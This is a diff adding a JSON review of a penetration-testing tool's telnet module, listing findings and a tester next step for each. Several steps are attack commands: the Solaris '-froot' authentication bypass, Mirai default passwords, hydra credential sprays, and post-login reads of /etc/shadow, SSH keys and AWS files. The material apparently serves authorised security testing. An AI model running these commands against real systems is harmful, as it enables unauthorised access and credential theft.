@@ -1,0 +1,191 @@
+{
+  "service": "telnet",
+  "summary": "Telnet module is the tranche's most complete: T0 presence-is-the-finding, T1 posture (no ENCRYPT offered, sniff runbook, TLS/AYT disambiguation), T2 pre-auth information disclosure (NEW-ENVIRON leak, NTLM AV_PAIR harvest, ENVIRON RFC1408 codes handled), T0 vendor+banner fingerprint (Cisco/BusyBox/Solaris/HP-UX/Juniper/\u2026), T0 known-bad CVE banner match (Solaris in.telnetd -f, netkit encrypt_keyid, BusyBox hardcoded), and \u2014 gated by RECCE_ACTIVE_ATTACKS=1 \u2014 T3/T4 attempts: vendor-conditioned default-cred sweep + Solaris CVE-2007-0882 -f auth-bypass primitive + timing-based user-enum. Feeds cleartext_creds and known_vendors. Biggest gap: no credentialed follow-through (post-auth `show version` / `uname -a` harvest) \u2014 findings mention 'cred_captures' but analyze never populates it.",
+  "module_files": [
+    "recce/services/telnet.py"
+  ],
+  "proposed_shared_surface_consumers": [
+    "known_users",
+    "known_hostnames",
+    "known_domains",
+    "known_vendors",
+    "cleartext_creds"
+  ],
+  "findings": [
+    {
+      "kind": "telnet_present",
+      "title_pattern": "Telnet service exposed (cleartext by design)",
+      "severity": "high",
+      "tier": "t0",
+      "tier_evidence": "Always fires when telnet port matches \u2014 enum-only.",
+      "can_promote_to": "stay",
+      "promotion_notes": "Sibling findings (sniff_runbook, no_encrypt, vendor_fingerprint) are the promotion channels.",
+      "promotion_risk": "none",
+      "tester_next_step": "tcpdump -i <iface> -A 's tcp port 23 and host IP' on the segment; any operator login leaks creds.",
+      "related_cves": []
+    },
+    {
+      "kind": "telnet_iac_fingerprint",
+      "title_pattern": "Telnet IAC fingerprint (vendor guess: <slug>)",
+      "severity": "info",
+      "tier": "t0",
+      "tier_evidence": "IAC WILL/DO options recorded \u2014 informational fingerprint.",
+      "can_promote_to": "stay",
+      "promotion_notes": "Feeds telnet_vendor_fingerprint and default-cred sweep dispatch.",
+      "promotion_risk": "none",
+      "tester_next_step": "telnet IP 23 ; observe IAC options; use for vendor-specific follow-up.",
+      "related_cves": []
+    },
+    {
+      "kind": "telnet_no_encrypt",
+      "title_pattern": "Telnet ENCRYPT option (RFC 2946) not offered",
+      "severity": "medium",
+      "tier": "t0",
+      "tier_evidence": "IAC WILL/DO stream examined for OPT_ENCRYPT presence \u2014 enum-only.",
+      "can_promote_to": "stay",
+      "promotion_notes": "Not directly promotable \u2014 motivates sniff/MITM.",
+      "promotion_risk": "none",
+      "tester_next_step": "wireshark on segment during login \u2014 every keystroke visible in clear.",
+      "related_cves": []
+    },
+    {
+      "kind": "telnet_environ_leak",
+      "title_pattern": "Telnet NEW-ENVIRON leaks env vars pre-auth (RFC 1572)",
+      "severity": "high",
+      "tier": "t2",
+      "tier_evidence": "Server actually returned an IS payload with concrete USER/LOGNAME/DISPLAY/\u2026 values pre-auth \u2014 a real information-disclosure exploit result, not just an advertisement.",
+      "can_promote_to": "t3",
+      "promotion_notes": "Feed leaked USER values into known_users so ssh/hydra sprays consume them; a landed pair is T3.",
+      "promotion_risk": "medium",
+      "tester_next_step": "hydra -L leaked_users.txt -P rockyou.txt telnet://IP:23 -t 4 -f -w 5 ; also try ssh://IP with same list.",
+      "related_cves": []
+    },
+    {
+      "kind": "telnet_vendor_fingerprint",
+      "title_pattern": "Telnet vendor/OS fingerprint: <vendor>",
+      "severity": "high",
+      "tier": "t0",
+      "tier_evidence": "Banner regex to vendor slug \u2014 fingerprint.",
+      "can_promote_to": "stay",
+      "promotion_notes": "Feeds default-cred sweep + known_vendors correlator.",
+      "promotion_risk": "none",
+      "tester_next_step": "telnet IP 23 \u2014 read banner ; consult vendor default-cred sheet ; try appropriate defaults with active_attacks=True",
+      "related_cves": []
+    },
+    {
+      "kind": "telnet_known_backdoor",
+      "title_pattern": "Solaris in.telnetd -f / netkit encrypt_keyid / BusyBox hardcoded",
+      "severity": "critical",
+      "tier": "t0",
+      "tier_evidence": "Regex on banner text against _KNOWN_BAD table \u2014 version-gated CVE claim, no exploit fired yet.",
+      "can_promote_to": "t3",
+      "promotion_notes": "Solaris path is already covered by telnet_solaris_dashf_rce (T3 when active_attacks fires). BusyBox path can be added: try root:xc3511/root:vizxv/etc from the Mirai list.",
+      "promotion_risk": "high",
+      "tester_next_step": "For SunOS 5.10: telnet -l -froot IP ; for BusyBox/embedded: try root:xc3511, root:vizxv, root:root; for netkit CVE-2020-10188: search github for encrypt_keyid PoC.",
+      "related_cves": [
+        "CVE-2007-0882",
+        "CVE-2020-10188"
+      ]
+    },
+    {
+      "kind": "telnet_solaris_dashf_rce",
+      "title_pattern": "Solaris in.telnetd -f authentication bypass (CVE-2007-0882)",
+      "severity": "critical",
+      "tier": "t3",
+      "tier_evidence": "Only fires when the gated try_login('-froot','') actually reached a shell prompt (_PROMPT_RX matched, no _FAIL_RX) \u2014 an actual root foothold.",
+      "can_promote_to": "t4",
+      "promotion_notes": "Run post-auth harvest (uname -a; cat /etc/passwd; cat /etc/shadow; find / -name id_rsa) to escalate to key material \u2014 currently stubbed by pr.get('cred_captures') never populated.",
+      "promotion_risk": "high",
+      "tester_next_step": "telnet -l -froot IP ; then: uname -a; id; cat /etc/shadow; find / -name id_rsa -o -name .aws 2>/dev/null; cp /var/adm/messages loot/",
+      "related_cves": [
+        "CVE-2007-0882"
+      ]
+    },
+    {
+      "kind": "telnet_default_creds",
+      "title_pattern": "Telnet accepted default credentials (<user>:<pass>)",
+      "severity": "critical",
+      "tier": "t3",
+      "tier_evidence": "Fires only when the gated default-cred sweep actually landed a shell prompt \u2014 proven foothold.",
+      "can_promote_to": "t4",
+      "promotion_notes": "Spray the same pair against SSH/HTTP-admin/SNMP/FTP on this host and the whole segment (embedded devices share creds). Post-auth: show running-config for Cisco / uname+/etc/shadow for BusyBox.",
+      "promotion_risk": "medium",
+      "tester_next_step": "hydra -l <user> -p <pass> ssh://IP,http-get://IP/,snmp://IP,ftp://IP ; on device: 'show running-config | inc snmp|enable secret|username' (Cisco) or wget backup",
+      "related_cves": []
+    },
+    {
+      "kind": "telnet_credentialed_shell",
+      "title_pattern": "Telnet credentialed shell \u2014 host identity captured",
+      "severity": "high",
+      "tier": "t3",
+      "tier_evidence": "Fires only when pr['cred_captures'] populated \u2014 but analyze() never populates it. Dead-code path currently.",
+      "can_promote_to": "t4",
+      "promotion_notes": "Implement post-auth capture after a successful default-cred hit (run 'id; uname -a; hostname; cat /etc/passwd') and feed known_users / known_hostnames.",
+      "promotion_risk": "low",
+      "tester_next_step": "After telnet_default_creds hit: telnet -l <user> IP + send: id; uname -a; hostname; cat /etc/passwd \u2014 feed output into known_users.",
+      "related_cves": []
+    },
+    {
+      "kind": "telnet_user_enum_timing",
+      "title_pattern": "Telnet login-prompt timing distinguishes valid users",
+      "severity": "medium",
+      "tier": "t1",
+      "tier_evidence": "Wall-clock differential vs baseline dummy users: 30% elapsed threshold \u2014 deterministic user-existence oracle. But not wired into analyze() \u2014 only exposed via timing_user_enum().",
+      "can_promote_to": "t3",
+      "promotion_notes": "Wire timing_user_enum() into analyze() behind active_attacks, feed known_users, then spray via try_login for T3.",
+      "promotion_risk": "medium",
+      "tester_next_step": "Call recce.services.telnet.timing_user_enum manually with a candidate list; feed valid= users to hydra -L <file> -P rockyou.txt telnet://IP.",
+      "related_cves": [
+        "CWE-208"
+      ]
+    },
+    {
+      "kind": "telnet_ntlm_info_leak",
+      "title_pattern": "Telnet AUTHENTICATION NTLM AV_PAIR leak",
+      "severity": "high",
+      "tier": "t2",
+      "tier_evidence": "Actual NTLMSSP CHALLENGE_MESSAGE bytes located in OPT_AUTH subneg and AV_PAIRs parsed for concrete NetBIOS/DNS/computer/domain/tree/timestamp \u2014 a real disclosure primitive.",
+      "can_promote_to": "t3",
+      "promotion_notes": "Feed nb_domain/dns_domain into known_domains, dns_computer into known_hostnames for AD/kerbrute/SMB downstream; timestamp bounds pass-the-hash windows.",
+      "promotion_risk": "none",
+      "tester_next_step": "kerbrute userenum -d <dns_domain> --dc <dns_computer> users.txt ; impacket-lookupsid <user>@<dns_computer> -no-pass",
+      "related_cves": []
+    },
+    {
+      "kind": "telnet_over_tls",
+      "title_pattern": "Telnet-over-TLS (telnets) detected",
+      "severity": "info",
+      "tier": "t0",
+      "tier_evidence": "992/TLS wrap succeeded \u2014 informational fingerprint.",
+      "can_promote_to": "stay",
+      "promotion_notes": "Not exploitable directly; still cleartext-inside-TLS same weak-auth issues apply once wrapper stripped.",
+      "promotion_risk": "none",
+      "tester_next_step": "openssl s_client -connect IP:992 \u2014 then interact as normal telnet.",
+      "related_cves": []
+    },
+    {
+      "kind": "telnet_sniff_runbook",
+      "title_pattern": "Telnet on-path capture yields creds in cleartext",
+      "severity": "high",
+      "tier": "t0",
+      "tier_evidence": "Chain finding \u2014 always fires for open telnet; not a probe result.",
+      "can_promote_to": "stay",
+      "promotion_notes": "By-design motivational finding.",
+      "promotion_risk": "none",
+      "tester_next_step": "tcpdump -i any -A -s0 'tcp port 23 and host IP' ; strings capture.pcap | grep -i -E 'user|pass|login'",
+      "related_cves": []
+    },
+    {
+      "kind": "telnet_ayt_liveness",
+      "title_pattern": "Telnet peer confirmed via IAC AYT",
+      "severity": "info",
+      "tier": "t0",
+      "tier_evidence": "IAC AYT response \u2014 informational disambiguation.",
+      "can_promote_to": "stay",
+      "promotion_notes": "Detection quality; no exploit path.",
+      "promotion_risk": "none",
+      "tester_next_step": "telnet IP 23 ; ^] ; send ayt \u2014 expect a text response",
+      "related_cves": []
+    }
+  ]
+}
